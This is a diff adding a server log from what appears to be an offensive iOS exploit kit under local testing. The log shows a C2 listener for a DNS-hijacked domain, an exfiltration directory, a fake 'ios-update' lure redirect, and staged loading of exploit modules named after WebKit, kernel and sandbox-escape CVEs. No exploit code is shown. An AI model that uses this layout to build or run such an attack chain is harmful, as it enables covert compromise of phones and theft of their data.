@@ -1,0 +1,607 @@
+[2026-08-13 13:29:57] [PORT-80] Native C2 proxy listener starting on port 80 (for DNS-hijacked sadjd.mijieqi.cn -> 192.168.31.16:80)
+[2026-08-13 13:29:57] Exploit server started on http://0.0.0.0:7070 | DB=False
+[2026-08-13 13:29:57] Payloads: D:\未测源码临时发布\coruna-pro-v2-master\server\payloads
+[2026-08-13 13:29:57] Exfil dir: D:\未测源码临时发布\coruna-pro-v2-master\server\exfil
+[2026-08-13 13:29:57] Log file: D:\未测源码临时发布\coruna-pro-v2-master\server\logs\server.log
+[2026-08-13 13:30:21] [REQUEST] "GET /downloaded/1334417664270db20af705f422878c53c8378203.min.js HTTP/1.1" 200 -
+[2026-08-13 13:30:21] [REQUEST] code 404, message Not Found
+[2026-08-13 13:30:21] [REQUEST] "GET /downloaded/377bed7460f7538f96bbad7bdc2b8294bdc54599.min.js HTTP/1.1" 404 -
+[2026-08-13 13:30:21] [REQUEST] "GET /downloaded/f8a86cf368fdbbe294813926a2a229df041eb758.min.js HTTP/1.1" 200 -
+[2026-08-13 13:30:21] [REQUEST] "GET /7d8f5bae97f37aa318bccd652bf0c1dc38fd8396.js HTTP/1.1" 200 -
+[2026-08-13 13:30:21] [REQUEST] "GET /Stage2_13.0_14.x_breezy.js HTTP/1.1" 200 -
+[2026-08-13 13:43:14] [PORT-80] Native C2 proxy listener starting on port 80 (for DNS-hijacked sadjd.mijieqi.cn -> 192.168.31.16:80)
+[2026-08-13 13:43:14] Exploit server started on http://0.0.0.0:7070 | DB=False
+[2026-08-13 13:43:14] Payloads: D:\未测源码临时发布\coruna-pro-v2-master\server\payloads
+[2026-08-13 13:43:14] Exfil dir: D:\未测源码临时发布\coruna-pro-v2-master\server\exfil
+[2026-08-13 13:43:14] Log file: D:\未测源码临时发布\coruna-pro-v2-master\server\logs\server.log
+[2026-08-13 13:43:32] [REQUEST] "GET /downloaded/377bed7460f7538f96bbad7bdc2b8294bdc54599.min.js HTTP/1.1" 200 -
+[2026-08-13 13:43:32] [REQUEST] "GET /downloaded/38af3c8ba461079a0edc83585023f76843066dcf.min.js HTTP/1.1" 200 -
+[2026-08-13 13:43:32] [REQUEST] "GET /downloaded/1334417664270db20af705f422878c53c8378203.min.js HTTP/1.1" 200 -
+[2026-08-13 13:43:32] [REQUEST] "GET /7d8f5bae97f37aa318bccd652bf0c1dc38fd8396.js HTTP/1.1" 200 -
+[2026-08-13 13:43:32] [REQUEST] "GET /Stage2_13.0_14.x_breezy.js HTTP/1.1" 200 -
+[2026-08-13 14:06:14] [PORT-80] Native C2 proxy listener starting on port 80 (for DNS-hijacked sadjd.mijieqi.cn -> 192.168.31.16:80)
+[2026-08-13 14:06:14] Exploit server started on http://0.0.0.0:7070 | DB=True
+[2026-08-13 14:06:14] Payloads: D:\未测源码临时发布\coruna-pro-v2-master\server\payloads
+[2026-08-13 14:06:14] Exfil dir: D:\未测源码临时发布\coruna-pro-v2-master\server\exfil
+[2026-08-13 14:06:14] Log file: D:\未测源码临时发布\coruna-pro-v2-master\server\logs\server.log
+[2026-08-13 14:06:57] [REQUEST] "GET /group.html HTTP/1.1" 200 -
+[2026-08-13 14:06:57] [REQUEST] "GET /payloads/manifest.json HTTP/1.1" 200 -
+[2026-09-10 17:44:35] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 17:44:35] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 17:44:35] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 17:44:35] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 17:44:59] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 from 127.0.0.1 (device: ios-dbg-localtest-1789033499)
+[2026-09-10 17:44:59] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 HTTP/1.1" 302 -
+[2026-09-10 17:44:59] [REQUEST] "GET /group.html?device_uuid=dbg-localtest2-1789033499 HTTP/1.1" 200 -
+[2026-09-10 17:44:59] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 from 127.0.0.1 (device: ios-dbg-localtest-1789033499)
+[2026-09-10 17:44:59] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 HTTP/1.1" 302 -
+[2026-09-10 17:44:59] [REQUEST] "GET /group.html?device_uuid=dbg-localtest2-1789033499 HTTP/1.1" 200 -
+[2026-09-10 17:44:59] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 from 127.0.0.1 (device: ios-dbg-localtest-1789033499)
+[2026-09-10 17:44:59] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 HTTP/1.1" 302 -
+[2026-09-10 17:44:59] [REQUEST] "GET /group.html?device_uuid=dbg-localtest2-1789033499 HTTP/1.1" 200 -
+[2026-09-10 17:44:59] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 from 127.0.0.1 (device: ios-dbg-localtest-1789033499)
+[2026-09-10 17:44:59] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-localtest-1789033499 HTTP/1.1" 302 -
+[2026-09-10 17:44:59] [REQUEST] "GET /group.html?device_uuid=dbg-localtest2-1789033499 HTTP/1.1" 200 -
+[2026-09-10 17:48:08] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 17:48:08] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 17:48:08] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 17:48:08] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 17:48:35] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-v1789033715 from 127.0.0.1 (device: ios-dbg-v1789033715)
+[2026-09-10 17:48:35] [REQUEST] "GET /group.html?device_uuid=dbg-g1789033715 HTTP/1.1" 302 -
+[2026-09-10 17:48:35] GET /e/index.html?device_uuid=dbg-i1789033715 from 127.0.0.1 (device: ios-dbg-i1789033715)
+[2026-09-10 17:48:35] [REQUEST] "GET /e/index.html?device_uuid=dbg-i1789033715 HTTP/1.1" 200 -
+[2026-09-10 17:48:35] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-v1789033715 from 127.0.0.1 (device: ios-dbg-v1789033715)
+[2026-09-10 17:48:35] [REQUEST] "GET /group.html?device_uuid=dbg-g1789033715 HTTP/1.1" 302 -
+[2026-09-10 17:48:35] GET /e/index.html?device_uuid=dbg-i1789033715 from 127.0.0.1 (device: ios-dbg-i1789033715)
+[2026-09-10 17:48:35] [REQUEST] "GET /e/index.html?device_uuid=dbg-i1789033715 HTTP/1.1" 200 -
+[2026-09-10 17:48:35] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-v1789033715 from 127.0.0.1 (device: ios-dbg-v1789033715)
+[2026-09-10 17:48:35] [REQUEST] "GET /group.html?device_uuid=dbg-g1789033715 HTTP/1.1" 200 -
+[2026-09-10 17:48:35] [REQUEST] "GET /e/index.html?device_uuid=dbg-i1789033715 HTTP/1.1" 302 -
+[2026-09-10 17:48:35] GET /ch/test001?ch=test001&tpl=ios-update&device_uuid=dbg-v1789033715 from 127.0.0.1 (device: ios-dbg-v1789033715)
+[2026-09-10 17:48:35] [REQUEST] "GET /group.html?device_uuid=dbg-g1789033715 HTTP/1.1" 200 -
+[2026-09-10 17:48:35] [REQUEST] "GET /e/index.html?device_uuid=dbg-i1789033715 HTTP/1.1" 302 -
+[2026-09-10 17:49:02] [REQUEST] "GET /native_bridge.js HTTP/1.1" 200 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /chain_loader.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /plugin_loader.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /exploit_registry.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /fallback_executor.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /metric_collector.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /ghostknife.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /coreaudio_trigger_CVE-2025-31200.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /angle_webgl_CVE-2025-14174.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /kernel_priv_CVE-2025-43520.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /webkit_uaf_CVE-2025-43529.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /webkit_ios16_exploits.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /webkit_sbx_CVE-2025-24201.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /bcmwlan_priv_escalation.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /bcm4387_bt_pivot.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /sbx0_main_18.4.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /sbx1_main.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /attack_chain_orchestrator.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /safari_redirect.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /pars_fingerprint.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /rce_module.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /rce_worker.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] "GET /Stage1_16.6_17.2.1_cassowary.js HTTP/1.1" 200 -
+[2026-09-10 17:49:02] [REQUEST] "GET /platform_module.js HTTP/1.1" 200 -
+[2026-09-10 17:49:02] [REQUEST] "GET /utility_module.js HTTP/1.1" 200 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /sbx0_main_15.8.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /sbx0_main_16.6.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /sbx0_main_17.2.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /sbx0_main_18.5.js HTTP/1.1" 404 -
+[2026-09-10 17:49:02] [REQUEST] code 404, message Not Found
+[2026-09-10 17:49:02] [REQUEST] "GET /sbx0_main_18.6.js HTTP/1.1" 404 -
+[2026-09-10 17:51:02] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 17:51:02] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 17:51:02] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 17:51:02] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 17:51:23] [REQUEST] "GET /native_bridge.js HTTP/1.1" 200 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /chain_loader.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /plugin_loader.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /exploit_registry.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /fallback_executor.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /metric_collector.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /ghostknife.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /coreaudio_trigger_CVE-2025-31200.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /angle_webgl_CVE-2025-14174.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /kernel_priv_CVE-2025-43520.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /webkit_uaf_CVE-2025-43529.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /webkit_ios16_exploits.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /webkit_sbx_CVE-2025-24201.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /bcmwlan_priv_escalation.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /bcm4387_bt_pivot.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /sbx0_main_18.4.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /sbx1_main.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /attack_chain_orchestrator.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /safari_redirect.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /pars_fingerprint.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /rce_module.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /rce_worker.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] "GET /Stage1_16.6_17.2.1_cassowary.js HTTP/1.1" 200 -
+[2026-09-10 17:51:23] [REQUEST] "GET /platform_module.js HTTP/1.1" 200 -
+[2026-09-10 17:51:23] [REQUEST] "GET /utility_module.js HTTP/1.1" 200 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /sbx0_main_15.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /sbx0_main_16.6.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /sbx0_main_17.2.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /sbx0_main_18.5.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /sbx0_main_26.js HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /ios_16_7.json HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /ios_18_5.json HTTP/1.1" 404 -
+[2026-09-10 17:51:23] [REQUEST] code 404, message Not Found
+[2026-09-10 17:51:23] [REQUEST] "GET /ios_26_1.json HTTP/1.1" 404 -
+[2026-09-10 17:55:14] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 17:55:14] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 17:55:14] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 17:55:14] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 17:55:29] [REQUEST] "GET /native_bridge.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /chain_loader.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /plugin_loader.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /exploit_registry.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /fallback_executor.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /metric_collector.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /ghostknife.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /coreaudio_trigger_CVE-2025-31200.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /angle_webgl_CVE-2025-14174.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /kernel_priv_CVE-2025-43520.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /webkit_uaf_CVE-2025-43529.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /webkit_ios16_exploits.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /webkit_sbx_CVE-2025-24201.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /bcmwlan_priv_escalation.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /bcm4387_bt_pivot.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /sbx0_main_18.4.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /sbx1_main.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /attack_chain_orchestrator.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /safari_redirect.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /pars_fingerprint.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /rce_module.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /rce_worker.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /Stage1_16.6_17.2.1_cassowary.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /platform_module.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /utility_module.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /sbx0_main_15.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] code 404, message Not Found
+[2026-09-10 17:55:29] [REQUEST] "GET /sbx0_main_16.6.js HTTP/1.1" 404 -
+[2026-09-10 17:55:29] [REQUEST] code 404, message Not Found
+[2026-09-10 17:55:29] [REQUEST] "GET /sbx0_main_17.2.js HTTP/1.1" 404 -
+[2026-09-10 17:55:29] [REQUEST] code 404, message Not Found
+[2026-09-10 17:55:29] [REQUEST] "GET /sbx0_main_18.5.js HTTP/1.1" 404 -
+[2026-09-10 17:55:29] [REQUEST] "GET /sbx0_main_26.js HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /ios_16_7.json HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /ios_18_5.json HTTP/1.1" 200 -
+[2026-09-10 17:55:29] [REQUEST] "GET /ios_26_1.json HTTP/1.1" 200 -
+[2026-09-10 18:17:02] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 18:17:02] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 18:17:02] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 18:17:02] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 18:17:28] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-92faaf688b329035b2d0ce2cd22afb4a)
+[2026-09-10 18:17:28] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 18:17:28] GET /e/index.html from 127.0.0.1 (device: ios-1b9db42a502003acc10771f9ade37e78)
+[2026-09-10 18:17:28] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:28] [REQUEST] "GET /group.html HTTP/1.1" 302 -
+[2026-09-10 18:17:28] GET /e/index.html from 127.0.0.1 (device: ios-64ff1c769fda40a6f81be74eb39d03ff)
+[2026-09-10 18:17:28] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:28] GET /e/index.html from 127.0.0.1 (device: ios-8208c448373e9e0755fb84c51447278f)
+[2026-09-10 18:17:28] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:28] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-5b6b717dfdf6f10b0c8d85ff0dae0bbf)
+[2026-09-10 18:17:28] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 18:17:28] GET /e/index.html from 127.0.0.1 (device: ios-10f4d0ca0fe518747f442378dffddf4c)
+[2026-09-10 18:17:28] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:28] [REQUEST] "GET /group.html HTTP/1.1" 302 -
+[2026-09-10 18:17:29] GET /e/index.html from 127.0.0.1 (device: ios-2d0e2a4ec7584651f37106cfb3c9ddab)
+[2026-09-10 18:17:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] GET /e/index.html from 127.0.0.1 (device: ios-6a4c4c5bcf8a4e7f658b0c0e00dbec42)
+[2026-09-10 18:17:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-1a8435a1724d810344369dd9550a09d7)
+[2026-09-10 18:17:29] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 18:17:29] GET /e/group.html from 127.0.0.1 (device: ios-bb769e186725017311ad67623a8ece84)
+[2026-09-10 18:17:29] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /group.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /e/index.html HTTP/1.1" 302 -
+[2026-09-10 18:17:29] GET /e/group.html from 127.0.0.1 (device: ios-c64ffbed3eea4a4f0067ce32d25f98c1)
+[2026-09-10 18:17:29] [REQUEST] "GET /e/group.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-fb3dd622eb9e92f10125c73633c4c799)
+[2026-09-10 18:17:29] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
+[2026-09-10 18:17:29] GET /e/index.html from 127.0.0.1 (device: ios-41711705fdc4a35ac622e2ef188723ac)
+[2026-09-10 18:17:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /group.html HTTP/1.1" 302 -
+[2026-09-10 18:17:29] GET /e/index.html from 127.0.0.1 (device: ios-1db1d59d47987bcb7e7c4621620da55d)
+[2026-09-10 18:17:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] GET /e/index.html from 127.0.0.1 (device: ios-5d08d4964848a822709c29b2cfba620b)
+[2026-09-10 18:17:29] [REQUEST] "GET /e/index.html HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /native_bridge.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /chain_loader.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /plugin_loader.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /exploit_registry.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /fallback_executor.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /metric_collector.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /ghostknife.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /coreaudio_trigger_CVE-2025-31200.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /angle_webgl_CVE-2025-14174.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /kernel_priv_CVE-2025-43520.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /webkit_uaf_CVE-2025-43529.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /webkit_ios16_exploits.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /webkit_sbx_CVE-2025-24201.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /bcmwlan_priv_escalation.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /bcm4387_bt_pivot.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /sbx0_main_18.4.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /sbx1_main.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /attack_chain_orchestrator.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /safari_redirect.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /pars_fingerprint.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /rce_module.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /rce_worker.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /Stage1_16.6_17.2.1_cassowary.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /platform_module.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /utility_module.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /sbx0_main_15.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /sbx0_main_26.js HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /ios_16_7.json HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /ios_18_5.json HTTP/1.1" 200 -
+[2026-09-10 18:17:29] [REQUEST] "GET /ios_26_1.json HTTP/1.1" 200 -
+[2026-09-10 18:18:06] Exploit server started on http://0.0.0.0:17070 | DB=True
+[2026-09-10 18:18:06] Payloads: D:\soft\ios-hacker\744-coruna\server\payloads
+[2026-09-10 18:18:06] Exfil dir: D:\soft\ios-hacker\744-coruna\server\exfil
+[2026-09-10 18:18:06] Log file: D:\soft\ios-hacker\744-coruna\server\logs\server.log
+[2026-09-10 18:23:29] GET /ch/test001?ch=test001&tpl=ios-update from 127.0.0.1 (device: ios-fd1e774ac47347678e8b8900122a018f)
+[2026-09-10 18:23:29] [REQUEST] "GET /ch/test001?ch=test001&tpl=ios-update HTTP/1.1" 302 -
